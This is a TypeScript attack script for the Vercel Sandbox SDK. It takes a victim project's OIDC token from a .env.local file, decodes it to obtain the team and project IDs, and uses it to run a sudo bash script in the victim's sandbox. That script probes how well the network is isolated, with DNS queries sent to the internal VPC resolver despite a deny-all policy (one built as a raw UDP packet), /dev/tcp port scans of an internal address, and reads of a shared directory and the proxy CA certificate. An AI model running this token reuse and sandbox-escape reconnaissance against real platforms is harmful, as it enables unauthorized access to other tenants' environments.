import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== 1. DNS to VPC resolver 172.31.0.2 under deny-all ==="
timeout 5 nslookup example.com 172.31.0.2 2>&1 | head -10
echo "--- raw UDP to 172.31.0.2:53 ---"
timeout 4 python3 - <<'PYEOF'
import socket, struct, random
tid = random.randint(0,65535)
q = b"\\x07example\\x03com\\x00"
dns = struct.pack("!HHHHHH", tid, 0x0100, 1, 0, 0, 0) + q + struct.pack("!HH", 1, 1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(3)
try:
    s.sendto(dns, ("172.31.0.2", 53))
    data, addr = s.recvfrom(2048)
    print("VPC DNS RESPONSE from %s: %d bytes" % (addr, len(data)))
    print(data[:80])
except Exception as e:
    print("no vpc dns response:", e)
PYEOF
echo "=== 2. /run/vercel/share contents ==="
ls -la /run/vercel/share 2>&1 | head -30
echo "=== 3. proxy CA cert ==="
ls -la /run/cell/ 2>&1 | head
openssl x509 -in /run/cell/ca-cert.pem -noout -subject -issuer -serial 2>&1 | head -5
echo "=== 4. TCP to 172.31.0.2 common ports ==="
for p in 53 80 443 22; do
  timeout 1 bash -c "echo > /dev/tcp/172.31.0.2/$p" 2>/dev/null && echo "VPC-DNS OPEN $p" || echo "vpc $p closed/timeout"
done
echo "=== 5. gateway DNS via 100.64.0.1 ==="
timeout 4 nslookup example.com 100.64.0.1 2>&1 | head -6
echo "=== 6. try the VPC DNS from resolv (was #MANUAL) ==="
cat /etc/resolv.conf
echo "=== 7. hostname in DNS? try reverse lookup of own ip ==="
timeout 4 nslookup 100.64.223.249 2>&1 | head -6
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore37.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore37.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
